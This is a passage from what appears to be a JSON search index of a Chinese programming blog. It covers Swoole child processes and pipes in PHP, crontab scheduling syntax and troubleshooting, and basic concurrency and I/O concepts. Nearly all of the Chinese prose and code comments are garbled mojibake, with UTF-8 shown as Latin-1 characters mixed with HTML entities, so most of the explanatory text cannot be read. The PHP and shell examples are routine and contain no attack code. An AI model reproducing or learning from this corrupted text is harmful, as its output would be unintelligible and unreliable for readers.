å¼‚æ­¥ç¼–ç¨‹ï¼Œå½“æœ‰å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œå°±åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹è¿›è¡Œæ¨é€æ•°æ®ï¼Œä½†å®¢æˆ·ç«¯è¿æ¥æ–­å¼€æ—¶ï¼Œå°±é€šè¿‡ä¿¡å·ç»“æŸè¯¥å®¢æˆ·ç«¯å¯¹åº”çš„å­è¿›ç¨‹ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole è¿›ç¨‹å­¦ä¹ ","slug":"swoole-process-learning","date":"2020-11-01T12:53:56.000Z","updated":"2020-11-03T14:33:18.115Z","comments":true,"path":"swoole-process-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-process-learning/","excerpt":"è®°å½•Swoole è¿›ç¨‹å­¦ä¹ è¿‡ç¨‹ã€‚","text":"è®°å½•Swoole è¿›ç¨‹å­¦ä¹ è¿‡ç¨‹ã€‚ 1. åˆ›å»ºä¸€ä¸ªè¿›ç¨‹123456789&lt;?php&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; ä¸ºè¿›ç¨‹è®¾ç½®åç§°cli_get_process_title(&quot;Master&quot;);while (true) &#123; sleep(1);&#125; 2. åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¦‚ä½•å›æ”¶å­è¿›ç¨‹ã€‚12345678910111213141516171819202122&lt;?php&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; ä¸ºè¿›ç¨‹è®¾ç½®åç§°cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); &#x2F;&#x2F; è¿™æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰å­è¿›ç¨‹éœ€è¦åšçš„äº‹æƒ…ã€‚ echo &quot;æˆ‘æ˜¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œæˆ‘çš„ID æ˜¯ï¼š&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; å¦‚æœå°±è¿™æ ·æ”¾ç€ä¸ç®¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹ä¸ä¼šè¢«å›æ”¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œè™½ç„¶åœ¨é‚£é‡Œä½†æ˜¯å¹¶æ²¡æœ‰åšäº‹æƒ…ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå·²ç»ç»“æŸäº†ã€‚&#125;);&#x2F;&#x2F; åˆ›å»º$child-&gt;start();&#x2F;&#x2F; å›æ”¶å­è¿›ç¨‹\\Swoole\\Process::wait();while (true) &#123; sleep(1);&#125; 3. é‡å®šå‘å­è¿›ç¨‹æ ‡å‡†è¾“å‡ºå­è¿›ç¨‹é»˜è®¤çš„æ ‡å‡†è¾“å‡ºæ˜¯è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå¯ä»¥é€šè¿‡å¯¹å­è¿›ç¨‹è®¾ç½®ï¼ŒæŠŠè¾“å‡ºé‡å®šå‘è‡³ç®¡é“ã€‚ ç„¶åå†ç”±ä¸»è¿›ç¨‹æŠŠç®¡é“ä¸­çš„å†…å®¹è¯»å–å‡ºæ¥ã€‚ 12345678910111213141516171819202122232425262728&lt;?php&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; ä¸ºè¿›ç¨‹è®¾ç½®åç§°cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); while (true) &#123; &#x2F;&#x2F; è¿™æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰å­è¿›ç¨‹éœ€è¦åšçš„äº‹æƒ…ã€‚ echo &quot;æˆ‘æ˜¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œæˆ‘çš„ID æ˜¯ï¼š&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; å¦‚æœå°±è¿™æ ·æ”¾ç€ä¸ç®¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹ä¸ä¼šè¢«å›æ”¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œè™½ç„¶åœ¨é‚£é‡Œä½†æ˜¯å¹¶æ²¡æœ‰åšäº‹æƒ…ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå·²ç»ç»“æŸäº†ã€‚ sleep(1); &#125;&#125;, true);&#x2F;&#x2F; åˆ›å»º$child-&gt;start();&#x2F;&#x2F; å›æ”¶å­è¿›ç¨‹ï¼Œæ˜¯å¦é˜»å¡ç­‰å¾…ï¼Œé»˜è®¤ä¸ºtrueï¼Œé˜»å¡ã€‚\\Swoole\\Process::wait(false);while (true) &#123; echo &quot;é€šè¿‡ä¸»è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å–ä¿¡æ¯ï¼š&quot;. $child-&gt;read(). PHP_EOL; sleep(1);&#125; è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥é€šè¿‡ä¸»è¿›ç¨‹é›†ä¸­å¤„ç†å­è¿›ç¨‹çš„è¾“å‡ºï¼ˆæ¯”å¦‚å¯ä»¥å†™å…¥æ—¥å¿—ï¼‰ï¼Œé¿å…è¾“å‡ºç›´æ¥åˆ°å±å¹•ä¸­äº†ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ï¼šæ˜¯å¦å°†è¾“å‡ºé‡å®šå‘è‡³ä¸»è¿›ç¨‹ã€‚trueï¼šå°†è¾“å‡ºé‡å®šå‘è‡³ä¸»è¿›ç¨‹ç®¡é“ã€‚falseï¼šç›´æ¥å°†è¾“å‡ºé‡å®šå‘è‡³å±å¹•ã€‚ ç¬¬äºŒä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ï¼šæ˜¯å¦åˆ›å»ºç®¡é“ã€‚0ï¼šä¸åˆ›å»º åˆ›å»ºTcp ç®¡é“ åˆ›å»ºUdp ç®¡é“ ç¬¬ä¸‰ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ï¼šæ˜¯å¦å¯ç”¨åç¨‹ã€‚ 4. å¤šä¸ªå­è¿›ç¨‹çš„å›æ”¶å¦‚æœä¸»è¿›ç¨‹åªæ˜¯æ‰§è¡Œä¸€æ¬¡å°±é€€å‡ºï¼Œè€Œå­è¿›ç¨‹è¿˜ä¸€ç›´åœ¨ï¼Œé‚£ä¹ˆä¸»è¿›ç¨‹ä¹Ÿä¸ä¼šç›´æ¥é€€å‡ºã€‚ å¦‚æœæœ‰å¤šä¸ªå­è¿›ç¨‹ï¼Œå…¶ä¸­æŸä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºäº†ï¼Œè€Œå¦ä¸€ä¸ªå¹¶æ²¡æœ‰é€€å‡ºï¼Œè¿™æ—¶ä¸»è¿›ç¨‹ä¹Ÿä¼šé€‰æ‹©é€€å‡ºï¼Œè€Œå‰©ä½™çš„é‚£ä¸ªå­è¿›ç¨‹åˆ™æˆäº†åƒµå°¸è¿›ç¨‹ã€‚å› ä¸ºå®ƒçš„çˆ¶è¿›ç¨‹çš„ID ä¸ºé›¶ã€‚ å¦‚æœä¸åšä¿¡å·å¤„ç†ï¼Œå¦åˆ™å­è¿›ç¨‹ä¸€æ—¦é€€å‡ºï¼Œéƒ½ä¼šå¼•èµ·çˆ¶è¿›ç¨‹é€€å‡ºã€‚å¦‚æœè¿™æ—¶è¿˜æœ‰å…¶ä»–å­è¿›ç¨‹æ²¡æœ‰é€€å‡ºï¼Œè¿™ä¼šé€ æˆå…¶ä»–å­è¿›ç¨‹å˜æˆåƒµå°¸è¿›ç¨‹ã€‚ åœ¨å­è¿›ç¨‹ä¸­åˆ›å»ºæœåŠ¡ åˆ†åˆ«æ˜¯Masterã€Managerã€Worker è¿›ç¨‹ï¼Œä»¥åŠè¯¥å­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚ å¯ä»¥å•ç‹¬è®¾ç½®http è¿›ç¨‹ï¼š 123$http-&gt;set([ &quot;worker_num&quot; &#x3D;&gt; 1]); è¿™æ ·çš„è¯ï¼Œè¿›ç¨‹å°±å˜æˆäº†ä¸¤ç±»ï¼š æœ€ä¸Šé¢é‚£ä¸ªæ˜¯çˆ¶è¿›ç¨‹ï¼Œä¸‹é¢ä¸‰ä¸ªåˆ†åˆ«æ˜¯Masterã€Mangerã€Worker è¿›ç¨‹ã€‚ 6. åœ¨è¿›ç¨‹ä¸­ä½¿ç”¨åç¨‹7. å­è¿›ç¨‹ä½¿ç”¨ç®¡é“è¿›è¡Œé€šä¿¡1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpuse \\Swoole\\Process;&#x2F;&#x2F; å¼•å…¥åç¨‹use \\Swoole\\Coroutine\\Mysql as Mysql;&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;$child &#x3D; new Process(function (Process $proces)&#123; &#x2F;&#x2F; $mysql &#x3D; new \\think\\db\\builder\\Mysql(); $mysql &#x3D; new Mysql(); $db &#x3D; $mysql-&gt;connect([&quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;, &quot;user&quot; &#x3D;&gt; &quot;root&quot;, &quot;password&quot; &#x3D;&gt; &quot;122410&quot;, &quot;database&quot; &#x3D;&gt; &quot;2v&quot;]); while (true) &#123; $sql &#x3D; &quot;select * from 2v.2v_user where is_delete &#x3D; 0 limit 0, 1&quot;; $rows &#x3D; $mysql-&gt;query($sql); if ($rows) &#123; $proces-&gt;write(&quot;æˆ‘æ˜¯ä¸€å·å­è¿›ç¨‹ï¼Œæ­£åœ¨æŸ¥è¯¢æ•°æ®ï¼š&quot;.$rows[0][&quot;user_name&quot;]); &#125; sleep(1); &#125;&#125;, false, 1, true);&#x2F;&#x2F; åˆ›å»ºå­è¿›ç¨‹$child-&gt;start();$child2 &#x3D; new Process(function (Process $process) &#123; while (true) &#123; sleep(1); $res &#x3D; $process-&gt;read(); if ($res) &#123; echo &quot;æˆ‘æ˜¯äºŒå·å­è¿›ç¨‹ï¼Œæ­£åœ¨è·å–æ•°æ®ï¼š&quot;.$res.PHP_EOL; &#125; &#125;&#125;);&#x2F;&#x2F; åˆ›å»ºç¬¬äºŒä¸ªå­è¿›ç¨‹$child2-&gt;start();while (true) &#123; &#x2F;&#x2F; ä¸€å·å­è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å–æ•°æ® $data &#x3D; $child-&gt;read(); if ($data) &#123; &#x2F;&#x2F; å¦‚æœæ•°æ®å­˜åœ¨ï¼ŒäºŒå·å­è¿›ç¨‹åˆ™å‘ç®¡é“ä¸­å†™å…¥æ•°æ® $child2-&gt;write($data); &#125; sleep(1);&#125;&#x2F;&#x2F; é€šè¿‡ä¿¡å·å›æ”¶å­è¿›ç¨‹Process::signal(SIGCHLD, function ($sig) &#123; &#x2F;&#x2F; å¿…é¡»ä¸ºfalseï¼Œéé˜»å¡æ¨¡å¼ while ($res &#x3D; Process::wait(false)) &#123; echo &quot;PID &#x3D; &#123;$res[&#39;pid&#39;]&#125;&quot;; &#125;&#125;); 8. å­è¿›ç¨‹ä½¿ç”¨é˜Ÿåˆ—è¿›è¡Œé€šä¿¡9. è®¾ç½®å®šæ—¶ä»»åŠ¡é€šè¿‡Swoole è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œåˆ°ç‚¹ä¹‹åè‡ªåŠ¨æ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚ æ ¸å¿ƒé€»è¾‘ï¼šåˆ›å»ºä¸€ä¸ªManager è¿›ç¨‹ï¼Œé€šè¿‡ä¸€ä¸ªwhile å¾ªç¯ï¼Œå®šæ—¶è·å–è·å–å½“å‰æ—¶é—´åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚ å¦‚æœéœ€è¦æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼Œåˆ™å‘é€ä¸€ä¸ªä¿¡å·ï¼Œåœ¨ä¸»è¿›ç¨‹ä¸­ç›‘å¬è¯¥ä¿¡å·ï¼Œ ç„¶åæ‰§è¡Œå¯¹åº”çš„ä¸šåŠ¡é€»è¾‘ã€‚ ä» Swoole 4.x ç‰ˆæœ¬å¼€å§‹ï¼Œä¸å†ä»¥ç›‘å¬ä¿¡å·çš„æ–¹å¼ä½œä¸ºå›æ”¶å­è¿›ç¨‹äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Crontab å¿«é€Ÿä¸Šæ‰‹","slug":"crontab-quick-start","date":"2020-10-27T15:22:29.000Z","updated":"2020-11-20T15:09:20.436Z","comments":true,"path":"crontab-quick-start/","link":"","permalink":"https://www.0x2beace.com/crontab-quick-start/","excerpt":"Crontab æ˜¯Unix ç³»ç»Ÿä¸­åŸºäºæ—¶é—´çš„ä»»åŠ¡ç®¡ç†å·¥å…·ã€‚","text":"Crontab æ˜¯Unix ç³»ç»Ÿä¸­åŸºäºæ—¶é—´çš„ä»»åŠ¡ç®¡ç†å·¥å…·ã€‚ è¿™ä¸ªå‘½ä»¤ä¸ä¼ ç»Ÿçš„ Unix å‘½ä»¤ä¸ä¸€æ ·ï¼Œä¸‹é¢ä¼šä¸€ä¸€ä»‹ç»å…¶è§„åˆ™åŠå…¶ç”¨æ³•ã€‚ crontab è¿˜æ˜¯ croncrontab è¿˜æ˜¯ cronï¼Ÿåˆæ¬¡æ¥è§¦ crontab çš„åŒå­¦å¯èƒ½ä¼šè¢«è¿™ä¸¤ä¸ªè¯ç»™ç»•æ™•ã€‚ å…¶å®å¯ä»¥è¿™æ ·æ¥ç†è§£ï¼šcrontabå°±æ˜¯ cronæœåŠ¡çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œcronåˆ™æ˜¯èƒŒåå¤„ç†crontabæŠ•é€’ä»»åŠ¡çš„æœåŠ¡ã€‚ æ–‡ä»¶æ ¼å¼crontab å‘½ä»¤æ˜¯ä»¥å›ºå®šçš„æ—¶é—´æ ¼å¼æ¥ä½¿ç”¨çš„ï¼Œ è¡¨ç¤ºæ„ä¹‰ åˆ†é’Ÿ å°æ—¶ æ—¥æœŸ æœˆä»½ å‘¨ å‘½ä»¤ èŒƒå›´ 0ï½59ï¼ˆ*ï¼‰ 0ï½23ï¼ˆ*ï¼‰ 1ï½31ï¼ˆ*ï¼‰ 1ï½12ï¼ˆ*ï¼‰ 0ï½7ï¼ˆ*ï¼‰ éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ å¦å¤–è¿˜æœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦å…·æœ‰ç‰¹æ®Šå«ä¹‰ï¼š * è¡¨ç¤ºä»»ä½•æ—¶åˆ»éƒ½æ¥æ”¶ã€‚ä¸¾ä¸ªæ —å­ï¼š* 12 * * * è¡¨ç¤ºä¸è®ºä½•æœˆã€ä½•æ—¥çš„æ˜ŸæœŸå‡ çš„åäºŒç‚¹éƒ½æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ã€‚ å¸¸ç”¨å®ä¾‹æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼š 1*&#x2F;1 * * * * æˆ–è€… * * * * * æ¯äº”åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼š 1*&#x2F;5 * * * * æ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡ï¼š 10 * * * * æˆ–è€… 0 *&#x2F;1 * * * æ¯å¤©æ‰§è¡Œä¸€æ¬¡ï¼š 10 0 * * * æ¯å‘¨æ‰§è¡Œä¸€æ¬¡ï¼š 10 0 * * 0 æ¯æœˆæ‰§è¡Œä¸€æ¬¡ï¼š 10 0 1 * 0 å¦‚ä½•ä½¿ç”¨åˆæ¬¡æ¥è§¦crontab å‘½ä»¤æ—¶ï¼Œæˆ‘ä¹Ÿæ¯”è¾ƒçº³é—·ï¼Œè¿™ä¸ªå‘½ä»¤å€’åº•æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿ ä½¿ç”¨ crontab æœ‰ä¸¤ç§æ–¹å¼ï¼š crontab -eï¼šç›´æ¥æ¥å—æ ‡å‡†è¾“å…¥ï¼ˆé”®ç›˜ï¼‰ä¸Šé”®å…¥çš„å‘½ä»¤ï¼Œå¹¶å°†å®ƒä»¬è½½å…¥crontabã€‚ crontab fileï¼šå°†file ä½œä¸ºcrontab çš„ä»»åŠ¡åˆ—è¡¨æ–‡ä»¶å¹¶è½½å…¥crontab ç¬¬ä¸€ç§æ–¹å¼æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç›´æ¥åœ¨ç»ˆç«¯æ·»åŠ  crontab ä»»åŠ¡å°±è¡Œäº†ï¼Œä¸‹é¢ç®€å•è¯´ä¸€ä¸‹ç¬¬äºŒç§ï¼ˆå…¶å®ä¸¤è€…çš„æ ¸å¿ƒéƒ½æ˜¯ä¸€æ ·çš„ï¼‰ã€‚ åˆ›å»ºcrontab æ–‡ä»¶é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„å†…å®¹ä»¥åŠŸèƒ½æè¿°ã€æ‰§è¡Œæ—¶é—´ã€æ‰§è¡Œä»»åŠ¡ è¿™å‡ éƒ¨åˆ†ç»„æˆã€‚ å…¶ä¸­ï¼Œå‰ä¸¤è€…å¹¶ä¸æ˜¯ä¸€å®šéœ€è¦ï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿è‡ªå·±æ—¥åæˆ–å…¶ä»–äººèƒ½å¿«é€ŸçŸ¥é“è¿™ä¸ªä»»åŠ¡å…·ä½“æ˜¯åšä»€ä¹ˆçš„ï¼Œ# è¡¨ç¤ºæ³¨é‡Šã€‚ ç¤ºä¾‹ï¼Œåˆ›å»ºä¸€ä¸ªåç§°ä¸ºscript_cron çš„crontab æ–‡ä»¶ï¼š 12# æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ script.php è„šæœ¬* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php è¿è¡Œcrontabä¸ºäº†æäº¤åˆšåˆšåˆ›å»ºçš„crontab æ–‡ä»¶ï¼Œå¯ä»¥æŠŠè¿™ä¸ªæ–°åˆ›å»ºçš„æ–‡ä»¶åç§°ä½œä¸ºcrontabå‘½ä»¤çš„å‚æ•°ï¼š 1$ crontab script_cron åˆ—å‡ºcron æœåŠ¡ä½¿ç”¨-l å‚æ•°åˆ—å‡ºcrontabæ–‡ä»¶ï¼š 123$ crontab -l# æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ script.php è„šæœ¬* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php ç¼–è¾‘cron æœåŠ¡1$ crontab -e åˆ é™¤cron æœåŠ¡1$ crontab -r å¸¸è§é—®é¢˜crontab æ²¡æœ‰ç«‹å³ç”Ÿæ•ˆæ–°åˆ›å»ºçš„cron ä»»åŠ¡ï¼Œä¸ä¼šé©¬ä¸Šæ‰§è¡Œï¼Œè‡³å°‘è¦è¿‡ä¸¤åˆ†é’Ÿæ‰æ‰§è¡Œã€‚ å¦‚æœå¸Œæœ›èƒ½é©¬ä¸Šæ‰§è¡Œï¼Œå¯ä»¥é‡å¯ crontab ã€‚ 12345&#x2F;&#x2F; Ubuntuï¼š$ service cron restart &#x2F;&#x2F; Centos$ service crond restart crontab å‹æ ¹æ²¡æ‰§è¡Œæœ‰æ—¶å€™ä¼šé‡åˆ°ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­å¯ä»¥æ‰§è¡Œä»»åŠ¡ï¼Œä½†æ˜¯å®šæ—¶ä»»åŠ¡å´æ€ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œ è¿™æ—¶é¦–å…ˆéœ€è¦ç¡®è®¤ cron æœåŠ¡æ˜¯å¦æ­£å¸¸ï¼š 12345&#x2F;&#x2F; Ubuntuï¼š$ service cron status &#x2F;&#x2F; Centos$ service crond status ç„¶åç¡®è®¤éœ€è¦æ‰§è¡Œçš„ä»»åŠ¡æ˜¯å¦åŒ…å«è·¯å¾„ï¼Œå¦‚æœåŒ…å«è¯·ä½¿ç”¨å…¨å±€è·¯å¾„ã€‚ æœ€åé‡å¯ cron æœåŠ¡ï¼Œé€šå¸¸åˆ°è¿™é‡Œå°±å·²ç»å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†ï¼Œå¦‚æœè¿˜ä¸è¡Œï¼Œå°è¯•å¼•å…¥ç¯å¢ƒå˜é‡ï¼š 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php crontab æ— æƒé™æ‰§è¡Œéœ€è¦æ³¨æ„çš„æ˜¯crontab ä»»åŠ¡çš„è°ƒåº¦ï¼Œåªæœ‰ root å’Œä»»åŠ¡æ‰€æœ‰è€…æ‹¥æœ‰æƒé™ã€‚ å¦‚æœæƒ³è¦ç¼–è¾‘/æŸ¥çœ‹/åˆ é™¤å…¶ä»–ç”¨æˆ·çš„ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ crontab -u &lt;username&gt; &lt;é€‰é¡¹&gt; å¸¸ç”¨é€‰é¡¹ï¼š-eï¼šç¼–è¾‘ä»»åŠ¡-lï¼šæŸ¥çœ‹ä»»åŠ¡-rï¼šåˆ é™¤ä»»åŠ¡ æŸ¥çœ‹ crontab ä»»åŠ¡æ‰§è¡Œæƒ…å†µå½“å®šæ—¶ä»»åŠ¡åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œæ—¶ï¼Œä¼šåŒæ­¥è¾“å‡ºç±»ä¼¼æ—¥å¿—ï¼š 12$ tail -f &#x2F;var&#x2F;log&#x2F;syslogNov 19 12:47:01 gigabit CRON[14521]: (root) CMD (&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php) æ­¤æ—¶å°±å¯ä»¥è‚¯å®šä»»åŠ¡è°ƒåº¦æ­£å¸¸ã€‚ ä¸Šé¢é‚£ç§æ–¹å¼ç¡®å®æœ‰æ•ˆï¼Œä½†æ˜¯å¹¶ä¸æ–¹ä¾¿ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼å‘¢ï¼Ÿ crontab é»˜è®¤æ²¡æœ‰ä»»åŠ¡çš„æ‰§è¡Œè®°å½•æ—¥å¿—ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æ‰‹åŠ¨åˆ›å»ºæ—¥å¿—æ–‡ä»¶ã€‚ 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php &gt;&gt; &#x2F;var&#x2F;log&#x2F;cron.log 2&gt;&amp;1 åœ¨script.php è„šæœ¬æœ€åé¢å¢åŠ ä¸€æ¬¡è¾“å‡ºï¼Œè¿™æ ·æ¯æ¬¡æ‰§è¡Œå®Œè„šæœ¬å°±ä¼šå°†è¾“å‡ºé‡å®šå‘è‡³cron.log æ—¥å¿—æ–‡ä»¶äº†ã€‚ å‚è€ƒé“¾æ¥ crontabç”¨æ³•ä¸å®ä¾‹ 19. crontab å®šæ—¶ä»»åŠ¡ Linux Crontabå‘½ä»¤å®šæ—¶ä»»åŠ¡åŸºæœ¬è¯­æ³•ä¸æ“ä½œæ•™ç¨‹-VPS/æœåŠ¡å™¨è‡ªåŠ¨åŒ–","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"}]},{"title":"Swoole å¸¸è§æ¦‚å¿µæ•´ç†","slug":"sorting-out-some-concepts-in-swoole","date":"2020-10-25T12:24:52.000Z","updated":"2023-02-18T03:28:33.606Z","comments":true,"path":"sorting-out-some-concepts-in-swoole/","link":"","permalink":"https://www.0x2beace.com/sorting-out-some-concepts-in-swoole/","excerpt":"Swoole æ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä¸€äº›æ–°æˆ–æ—§çš„æ¦‚å¿µï¼Œåœ¨æ­¤æ•´ç†ä¸€ä¸‹ã€‚","text":"Swoole æ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä¸€äº›æ–°æˆ–æ—§çš„æ¦‚å¿µï¼Œåœ¨æ­¤æ•´ç†ä¸€ä¸‹ã€‚ é•¿è¿æ¥/çŸ­è¿æ¥é•¿è¿æ¥ï¼š å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å»ºç«‹è¿æ¥åä¸è¿›è¡Œæ–­å¼€ï¼Œä¹‹åå®¢æˆ·ç«¯å†æ¬¡è®¿é—®è¿™ä¸ªæœåŠ¡å™¨ä¸Šçš„å†…å®¹æ—¶ï¼Œç»§ç»­ä½¿ç”¨è¿™ä¸€æ¡è¿æ¥é€šé“ã€‚çŸ­è¿æ¥ï¼š å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å»ºç«‹è¿æ¥ï¼Œå‘é€å®Œæ•°æ®åç«‹é©¬æ–­å¼€è¿æ¥ã€‚ä¸‹æ¬¡è¦å–æ•°æ®ï¼Œéœ€è¦å†æ¬¡å»ºç«‹è¿æ¥ã€‚ ä¸²è¡Œ/å¹¶è¡Œ/å¹¶å‘ä¸²è¡Œï¼šæ‰§è¡Œå¤šä¸ªä»»åŠ¡æ—¶ï¼Œå„ä¸ªä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œå®Œæˆä¸€ä¸ªä¹‹åæ‰èƒ½è¿›è¡Œä¸‹ä¸€ä¸ªã€‚å¹¶è¡Œï¼šå¤šä¸ªä»»åŠ¡åœ¨åŒä¸€æ—¶é—´ç‚¹å‘ç”Ÿå¹¶æ‰§è¡Œã€‚å¹¶å‘ï¼šåŒä¸€æ—¶é—´æ®µéœ€è¦æ‰§è¡Œå¤šä¸ªä»»åŠ¡ IOï¼ˆInput/Outputï¼Œè¾“å…¥è¾“å‡ºï¼‰åœ¨è®¡ç®—æœºä¸­ï¼Œè¾“å…¥ / è¾“å‡ºï¼ˆå³ IOï¼‰æ˜¯æŒ‡ä¿¡æ¯å¤„ç†ç³»ç»Ÿï¼ˆæ¯”å¦‚è®¡ç®—æœºï¼‰å’Œå¤–éƒ¨ä¸–ç•Œï¼ˆå¯ä»¥æ˜¯äººæˆ–å…¶ä»–ä¿¡æ¯å¤„ç†ç³»ç»Ÿï¼‰çš„é€šä¿¡ã€‚ è¾“å…¥æ˜¯æŒ‡ç³»ç»Ÿæ¥æ”¶çš„ä¿¡å·æˆ–æ•°æ®ï¼Œè¾“å‡ºæ˜¯æŒ‡ä»ç³»ç»Ÿå‘å‡ºçš„æ•°æ®æˆ–ä¿¡å·ã€‚ æ¶‰åŠåˆ°IO æ“ä½œçš„é€šå¸¸æœ‰ç£ç›˜ã€ç½‘ç»œã€æ–‡ä»¶ç­‰ã€‚ åŒæ­¥/å¼‚æ­¥åŒæ­¥å’Œå¼‚æ­¥æ˜¯ä¸€ç§æ¶ˆæ¯é€šä¿¡æœºåˆ¶ã€‚å…¶å…³æ³¨ç‚¹åœ¨äº è¢«è°ƒç”¨è€…è¿”å› å’Œ ç»“æœè¿”å› ä¹‹é—´çš„å…³ç³»ï¼Œ 